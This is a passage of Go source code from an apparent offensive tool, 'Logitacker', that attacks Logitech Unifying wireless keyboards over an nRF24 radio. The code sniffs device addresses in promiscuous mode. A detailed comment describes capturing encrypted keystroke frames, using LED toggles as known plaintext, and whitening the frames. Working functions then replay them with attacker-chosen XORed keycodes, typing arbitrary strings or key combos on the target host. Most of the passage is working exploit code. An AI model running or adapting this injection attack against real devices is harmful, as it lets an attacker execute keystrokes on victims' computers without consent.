			activeModifiers = append(activeModifiers, test)
			modStr += test.String() + " "
		}
	}

	keyStr := ""
	activeKeys := make([]hid.HIDKey, 0)
	for _, key := range r[1:7] {
		if key != 0x00 {
			hidKey := hid.HIDKey(key)
			activeKeys = append(activeKeys, hidKey)
			keyStr += hidKey.String() + " "
		}
	}

	if len(modStr) == 0 {
		modStr = "NONE"
	}
	if len(keyStr) == 0 {
		keyStr = "NONE"
	}

	return fmt.Sprintf("modifiers: %s keys: %s", modStr, keyStr)
}

var (
	UnecryptedKeyboardReportTemplate = LogitackerUnecryptedKeyboardReport{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc9}
)

func (lt *Logitacker) RollOverCounterReuseCache(device *LogitackerDevice) {
	reports := make([]LogitackerUnecryptedKeyboardReport, 0)
	for i := 0; i < 23; i++ {
		reports = append(reports, LogitackerUnecryptedKeyboardReport{}) //Empty report / all keys up
	}
	lt.SendEncryptedReports(device, reports)

}

func (lt *Logitacker) SendEncryptedReports(knownDev *LogitackerDevice, reports []LogitackerUnecryptedKeyboardReport) {
	lt.Nrf24.EnterSnifferMode(knownDev.RfAddress, false)

	counter := make([]byte, 4)
	rfReportDelay := time.Millisecond * 4

	//	keepAlive8 := []byte{0x00, 0x40, 0x00, 0x08, 0xb8}
	setKeepAlive88 := []byte{0x00, 0x4f, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x59}
	setKeepAlive1100 := []byte{0x00, 0x4f, 0x00, 0x04, 0x4c, 0x00, 0x00, 0x00, 0x00, 0x61}

	reportIdx := 0

	for reportIdx < len(reports) {
		c, eFind := lt.FindDevice(context.Background(), knownDev.RfAddress)
		if eFind == nil {
			fmt.Printf("Dongle listening for device %s on channel %d\n", knownDev.RfAddress.String(), c)
		Inner:
			for reportIdx < len(reports) {
				binary.BigEndian.PutUint32(counter, knownDev.Counter)
				pay := knownDev.EncryptKeyboardRawReport(reports[reportIdx], counter)
				knownDev.Counter++
				_, eTx := lt.Nrf24.TransmitPayload(pay, 3, 4)
				if eTx != nil {
					//re-check channel
					break Inner
				}

				time.Sleep(rfReportDelay * 2)

				reportIdx++

				//ToDo Vulnerability: an attacker only needs to know 23 payloads with counter to inject encrypted payloads (after 21 counters they could be reused XOR'ed with different payloads)
				//counteruint %= 23
			}

		}
	}

	time.Sleep(rfReportDelay)
	lt.Nrf24.TransmitPayload(setKeepAlive88, 3, 4)
	time.Sleep(rfReportDelay)
	lt.Nrf24.TransmitPayload(setKeepAlive1100, 3, 4)
	time.Sleep(rfReportDelay)

}

func (lt *Logitacker) SnoopForDeviceAddress(ctx context.Context, hopDelay time.Duration) (device *LogitackerDevice, err error) {
	//set radio into pseudo promiscous mode
	fmt.Println("Entering promiscuous mode and try to discover a device...")
	lt.Nrf24.EnterPromiscuousMode()

	hopTime := time.Now()
	for {

		p, _ := lt.Nrf24.ReceivePayload()
		//if len(p) > 1 && p[2] == 0x77 && p[3] == 0x82 {
		//if len(p) > 1 && p[0] == 0x77 && p[1] == 0x82 {
		if len(p) > 1 { // && p[0] == 0xef && p[1] == 0x05 {
			addrfound := Nrf24Addr{p[0], p[1], p[2], p[3], p[4]}
			fmt.Printf("... valid ESB from address %s (channel %d), check if dongle is in range\n", addrfound.String(), lt.GetChannel())
			if lt.ValidateDongleForPotentialDevice(p, 3) {
				fmt.Println("... dongle in range")
				//The address with last octet replaced by 0x00 is reachable, which is likely a dongle, so we consider the
				// address found a valid device address

				device = &LogitackerDevice{
					RfAddress: addrfound,
				}
				lt.KnownDevices[addrfound.String()] = device
				return
			}
			fmt.Println("dongle not reachable, continue sniffing in promiscuous mode")
			//re-enter promiscous mode
			lt.Nrf24.EnterPromiscuousMode()
		}
		if time.Since(hopTime) > hopDelay {
			lt.NextChannel()
			hopTime = time.Now()
			//	fmt.Println("New channel", lt.GetChannel())
		}
	}

	return
}

/*
XOR Injection uses a deterministic approach.
Even if AES counter re-use isn't allowed on latest Unifying dongles (one of the issues reported by Bastille)
current Unifying dongles are affected by replay attacks. Only a few counters are "cached" before replaying
is possible again.

An attacker only has to capture enough frames (> 24) with encrypted keystrokes, to replay them.

As encryption is done with a weak XOR scheme, known plaintext (== known unencrypted HID keyboard reports) would
allow to "whiten" a captured sequence re-play-able of key strokes. Whitening means, the plaintext is XOR'ed
back onto the encrypted frame, to reveal the pure cipher. A whitened frame, again, allows to XOR new arbitrary
HID key codes on top of it.

In order to succeed, the attacker needs to know the plaintext for the full captured encrypted keystroke sequence.

This condition is partially met, if the attacker is able to distinguish key down vs key release frames (without decryption).
In this case, he knows, that every key up report has all key codes set to 0x00 (we don't care for modifiers in this
PoC). For the key down report, the attacker still has to guess, unless he pressed the keys himself (and knows the keycodes).

A semi-automated approach is possible, because LED output reports are transmitted back to the device (without encryption).
The point in time, those LED output reports occur, depend on the host OS (f.e. Windows sends the LED report after
key down, Linux could send LED reports after key up or down - depending on the resulting LED state).

Additionally it has been observed, that most devices send a "Set keep alive" report after a key release frame, but not
after a key down frame (a key down frame is followed by keep alive frames to pull outbound reports, not by set keep alive
frames). This helps to distinguish key down vs key up.

Based on observations, two approaches worked to capture streams of encrypted keyboard reports which continuously toggle
a LED (to obtain known plaintext). Neither of them works in all scenarios, so a fail-over has been implemented:

Approach 1:
- encrypted key reports without a successive "set keep alive" are interpreted as key down payload
- encrypted key reports with a successive "set keep alive" are interpreted as key release payload
- if a key release payload succeeds a key down payload and a LED output report occured between all of those
reports, the sequence of both encrypted reports is considered to have known plaintext (the key responsible for toggling
the respective LED, followed by a key release)
- if the aforementioned encrypted keyboard reports don't have successive counters, the stream is considered interrupted
and capturing is started from the beginning
- the process is repeated till the needed number of encrypted keystrokes has been captured, all with successive counters
- the easiest way to achieve this, is that an attacker with physical access continuously toggles the LED (pressing CAPS
LOCK about 13 times)

Approach 2:
- "set keep alive" reports are ignored, as they don't occur after all key release frames (if the LED is toggled to onm
the device continues to send keep alives after the key release; only if the LED is toggled of, a "set keep alive" is
sent after key release)
- thanks to the frequent keep alive, LED output reports occur after key down reports and not after key release reports
- this behavior is used to distinguish key down versus keyrelease

As an remote attacker couldn't know, which approach works better, the implementation switches between those to variants
if the assumed keystream is interrupted to often.

Note: The code doesn't inspect which LED has and assumes CAPS LOCK is the source of the report.



*/

const ENCRYPTED_REPORT_TYPE_GUESSER_VALIDATION_LENGTH = 15 //amount of successive keyup / down reports needed for replay
type EncrypteReportTypeGuesser struct {
	TypeBuf          []RFFrameType
	ReportBuf        [][]byte
	TimeStampBuf     []time.Duration
	Counter          uint32
	LastLEDReport    []byte
	validationLength int
	validCount       int
}

func (e *EncrypteReportTypeGuesser) String() (res string) {
	for idx, ft := range e.TypeBuf {
		switch ft {
		case FT_KEYBOARD_ENCRYPTED:
			res += "K"
			/*
		case FT_SET_KEEP_ALIVE:
			res += "S"
			*/
		case FT_LED_REPORT:
			res += "L"
			switch e.ReportBuf[idx][2] { //corresponding LED state change
			case 0:
				res += "no change" //shouldn't happen, as we ignore this case (repeated report)
			case 1:
				res += "(num)"
			case 2:
				res += "(caps)"
			case 4:
				res += "(scroll)"
			}
		}
	}

	return res
}

func (e *EncrypteReportTypeGuesser) ProgresString() (res string) {
	res = e.String()
	res += "\n"
	res += fmt.Sprintf("%02.02f percent", (float32(e.validCount) / (float32(e.validationLength))*100.0))
	return res
}

func (e *EncrypteReportTypeGuesser) AppendReport(ft RFFrameType, pay []byte, t time.Duration) (fullSequenceObtained bool) {
	if e.validationLength == 0 {
		e.validationLength = ENCRYPTED_REPORT_TYPE_GUESSER_VALIDATION_LENGTH
	}
	if e.TypeBuf == nil {
		e.TypeBuf = make([]RFFrameType, 0)
	}
	if e.ReportBuf == nil {
		e.ReportBuf = make([][]byte, 0)
	}
	if e.TimeStampBuf == nil {
		e.TimeStampBuf = make([]time.Duration, 0)
	}

	if ft == FT_LED_REPORT {
		//if first LED report, reset all buffers and store initial LED report state
		if e.LastLEDReport == nil {
			e.TypeBuf = e.TypeBuf[0:0]
			e.TimeStampBuf = e.TimeStampBuf[0:0]
			e.ReportBuf = e.ReportBuf[0:0]
			e.validCount = 0
			e.LastLEDReport = pay
			return
		} else {
			//modify LED report to store the state change instead of absolute state, they are thrown away, anyways
			stateChange := pay[2] ^ e.LastLEDReport[2]

			if stateChange == 0 {
				return //we ignore LED reports without state change and don't add them to the record buffers
			}

			copy(e.LastLEDReport, pay) //store unmodified report for comparison
			pay[2] = stateChange       //overwrite LED state with state change
		}
	} else if ft == FT_KEYBOARD_ENCRYPTED {
		counter := binary.BigEndian.Uint32(pay[10:14])
		// if counter isn't successor, clear all buffers
		if counter != e.Counter+1 {
			e.TypeBuf = e.TypeBuf[0:0]
			e.TimeStampBuf = e.TimeStampBuf[0:0]
			e.ReportBuf = e.ReportBuf[0:0]
			e.validCount = 0
		}
		//update counter
		e.Counter = counter
	} else {
		return //ignore other reports
	}

	e.TypeBuf = append(e.TypeBuf, ft)
	e.ReportBuf = append(e.ReportBuf, pay)
	e.TimeStampBuf = append(e.TimeStampBuf, t)

	// shift out reports if the buffer exceeds maximum reports needed
	for len(e.TypeBuf) > e.validationLength*3 {
		e.shiftRecordsLeft()
	}

	return e.validateRecord()
}

func (e *EncrypteReportTypeGuesser) validateRecord() (success bool) {
	numRecords := len(e.TypeBuf)
	if numRecords < 3 {
		return false
	}

	//validate triplets of input frames, starting from end of record buffers
	validCount := 0
	for pos := len(e.TypeBuf) - 3; pos >= 0; pos -= 3 {
		if !e.validateTriplet(e.TypeBuf[pos:]) {
			//fmt.Printf("not validate (%d): %+v\n", pos, e.TypeBuf[pos:])
			break
		} else {
			validCount++
			e.validCount = validCount // update state
			// check if we reached the needed count of valid reports
			if validCount >= e.validationLength {
				//yes, truncate to valid records
				start := len(e.TypeBuf) - 3*validCount
				e.TypeBuf = e.TypeBuf[start:]
				e.ReportBuf = e.ReportBuf[start:]
				e.TimeStampBuf = e.TimeStampBuf[start:]
				return true
			}
		}
	}

	//fmt.Println("valid:", validCount)

	return false
}

func (e *EncrypteReportTypeGuesser) validateTriplet(triplet []RFFrameType) bool {
	if len(triplet) < 3 {
		return false
	}

	// special case (sixlet): a sequence of K,K,L,K,K,L is not valid (but K,L,K,K,L,K)
	if len(triplet) > 5 {
		if triplet[0] == FT_KEYBOARD_ENCRYPTED && triplet[1] == FT_KEYBOARD_ENCRYPTED && triplet[2] == FT_LED_REPORT &&
			triplet[3] == FT_KEYBOARD_ENCRYPTED && triplet[4] == FT_KEYBOARD_ENCRYPTED && triplet[5] == FT_LED_REPORT {
			return false
		}
	}

	if triplet[0] == FT_KEYBOARD_ENCRYPTED && triplet[1] == FT_KEYBOARD_ENCRYPTED && triplet[2] == FT_LED_REPORT {
		// special case 2: for KKL predecessor should be KLK
		if len(triplet) > 5 && !(triplet[3] == FT_KEYBOARD_ENCRYPTED && triplet[4] == FT_LED_REPORT && triplet[5] == FT_KEYBOARD_ENCRYPTED) {
			return false
		}
		return true
	}
	if triplet[0] == FT_KEYBOARD_ENCRYPTED && triplet[1] == FT_LED_REPORT && triplet[2] == FT_KEYBOARD_ENCRYPTED {
		return true
	}

	return false
}

//removes first element from all records
func (e *EncrypteReportTypeGuesser) shiftRecordsLeft() {
	if len(e.TypeBuf) == 0 {
		return
	}

	e.TypeBuf = e.TypeBuf[1:]
	e.ReportBuf = e.ReportBuf[1:]
	e.TimeStampBuf = e.TimeStampBuf[1:]
}

// return only whitened version of encrypted key reports
func (e *EncrypteReportTypeGuesser) WhitenedResult() (result [][]byte) {
	fmt.Println("transforming encrypted key reports to blank reports...")
	for i := 0; i < len(e.TypeBuf); i += 3 {
		e.whitenTriplet(e.TypeBuf[i:], e.ReportBuf[i:])
	}

	result = make([][]byte, 0)



	for idx, rfType := range e.TypeBuf {
		if rfType == FT_KEYBOARD_ENCRYPTED {
			result = append(result, e.ReportBuf[idx])
		}

	}

	return
}

func (e *EncrypteReportTypeGuesser) whitenTriplet(tripletRFType []RFFrameType, tripletReport [][]byte) {
	if len(tripletRFType) < 3 {
		return
	}
	if len(tripletReport) < 3 {
		return
	}

	xorKey := byte(0)
	if tripletRFType[0] == FT_KEYBOARD_ENCRYPTED && tripletRFType[1] == FT_KEYBOARD_ENCRYPTED && tripletRFType[2] == FT_LED_REPORT {
		xorKey = e.ledChangeToKey(tripletReport[2][2], true)
	}
	if tripletRFType[0] == FT_KEYBOARD_ENCRYPTED && tripletRFType[1] == FT_LED_REPORT && tripletRFType[2] == FT_KEYBOARD_ENCRYPTED {
		xorKey = e.ledChangeToKey(tripletReport[1][2], true)

	}

	tripletReport[0][3] = tripletReport[0][3] ^ xorKey //whiten key down report
	LogitechChecksum(tripletReport[0])                 //Fix checksum

	return
}

func (EncrypteReportTypeGuesser) ledChangeToKey(ledStateToggle byte, log bool) (hidKey byte) {
	switch ledStateToggle {
	case 1: //num
		if log {
			fmt.Println("eliminated NUM LOCK key")
		}
		return byte(hid.HID_KEY_NUMLOCK)
	case 2: //caps
		if log {
			fmt.Println("eliminated CAPS LOCK key")
		}
		return byte(hid.HID_KEY_CAPSLOCK)
	case 3: //scroll
		if log {
			fmt.Println("eliminated SCROLL LOCK key")
		}
		return byte(hid.HID_KEY_SCROLLLOCK)
	default:
		return 0
	}
}

func (lt *Logitacker) SniffReplayXORRawDownReports(dev *LogitackerDevice, debug bool, reports []hid.KeyboardOutReport, targetKeyboardLayout string) {
	/* data generation part */

	// Sniff for encrypted keyboard frames with LED toggles (known plain text) and whiten (clean out corresponding LED
	// toggle keys) from the reports. A sequence of whitened reports, large enough to be used for continuous replay
	// (overflows dongle's counter cache) is stored along with the device data. This has to be done only once.
	err := dev.CaptureAndWhitenEncryptedXORFrames(context.Background(), lt, debug)
	if err != nil {
		fmt.Printf("Couldn't capture enough XOR-able frames, %v\n", err)
		return
	}

	/* Transmission part */
	dev.SendReportsWithWhitenedXOR(lt, reports)
}

func (lt *Logitacker) SniffReplayXORType(dev *LogitackerDevice, debug bool, outstring string, targetKeyboardLayout string) {
	/* data generation part */

	// Sniff for encrypted keyboard frames with LED toggles (known plain text) and whiten (clean out corresponding LED
	// toggle keys) from the reports. A sequence of whitened reports, large enough to be used for continuous replay
	// (overflows dongle's counter cache) is stored along with the device data. This has to be done only once.
	err := dev.CaptureAndWhitenEncryptedXORFrames(context.Background(), lt, debug)
	if err != nil {
		fmt.Printf("Couldn't capture enough XOR-able frames, %v\n", err)
		return
	}

	/* Transmission part */

	// Convert the string given by `outstring` to USB HID reports (only key downs, key release reports have to be
	// added before use), with respect to the target's keyboard language layout.
	lt.keyboard.SetActiveLanguageMap(targetKeyboardLayout)
	lt.FindDevice(context.Background(), dev.RfAddress)                    // Find device channel
	keyboardReports, _ := lt.keyboard.StringToPressKeySequence(outstring) //Generate keyboard reports from string
	dev.SendReportsWithWhitenedXOR(lt, keyboardReports)
}

func (lt *Logitacker) SniffReplayXORPress(dev *LogitackerDevice, debug bool, outKeyComboString string, targetKeyboardLayout string) {
	/* data generation part */

	// Sniff for encrypted keyboard frames with LED toggles (known plain text) and whiten (clean out corresponding LED
	// toggle keys) from the reports. A sequence of whitened reports, large enough to be used for continuous replay
	// (overflows dongle's counter cache) is stored along with the device data. This has to be done only once.
	err := dev.CaptureAndWhitenEncryptedXORFrames(context.Background(), lt, debug)
	if err != nil {
		fmt.Printf("Couldn't capture enough XOR-able frames, %v\n", err)
		return
	}

	/* Transmission part */

	// Convert the string given by `outstring` to USB HID reports , with respect to the target's keyboard language layout.
	lt.keyboard.SetActiveLanguageMap(targetKeyboardLayout)
	lt.FindDevice(context.Background(), dev.RfAddress)                   // Find device channel
	keyboardReport, _ := lt.keyboard.StringToKeyCombo(outKeyComboString) //Generate keyboard reports from string

	// Loop over whitened encrypted keyboard frames and XOR a USB HID report payload onto each, then transmit the
	// resulting frame. The method iterates over the list of the whitened frames. If more reports have to be sent, than
	// whitened frames are available, iteration over whitened frames starts from the beginning. The latter is only
	// possible, if enough whitened frames are available to overflow the "anti counter reuse" buffer of the dongle
	// (or whatever the mechanism is called).
	dev.SendReportsWithWhitenedXOR(lt, keyboardReport)
}

func NewLogitacker() (res *Logitacker, err error) {
	res = &Logitacker{}

	res.Nrf24, err = NewNRF24()
	if err != nil {
		return
	}

	kbd, eKey := hid.NewKeyboard(context.Background(), "./keymaps")
	if eKey != nil {
		panic(eKey)
	}
	kbd.SetActiveLanguageMap("us")
	res.keyboard = kbd

	res.Nrf24.EnableLNA()
	res.Nrf24.EnterPromiscuousMode()

	/*
	res.InitChannelPresetLogitech12()
	fmt.Printf("Channels: %v\n", res.Channels)
    */

	//    res.InitChannelPresetAll()
	//	res.InitChannelPresetLogitech26()
	res.InitChannelPresetLogitechOptimized()
	//fmt.Printf("Using channels: %v\n", res.Channels)

	res.KnownDevices = make(map[string]*LogitackerDevice)

	return
}

/*
* helper
*/
func DecryptAes128Ecb(data, key []byte) []byte {
	cipher, _ := aes.NewCipher([]byte(key))
	decrypted := make([]byte, len(data))
	size := 16

	for bs, be := 0, size; bs < len(data); bs, be = bs+size, be+size {
		cipher.Decrypt(decrypted[bs:be], data[bs:be])
	}

	return decrypted
}

func EncryptAes128Ecb(data, key []byte) []byte {
	cipher, _ := aes.NewCipher([]byte(key))
	encrypted := make([]byte, len(data))
	size := 16

	for bs, be := 0, size; bs < len(data); bs, be = bs+size, be+size {
		cipher.Encrypt(encrypted[bs:be], data[bs:be])
	}

	return encrypted
}

func LogitechChecksum(payload []byte) {
	chksum := byte(0xff)
	for i := 0; i < len(payload)-1; i++ {
		chksum = (chksum - payload[i]) & 0xff
	}
	chksum = (chksum + 1) & 0xff

	payload[len(payload)-1] = chksum
}
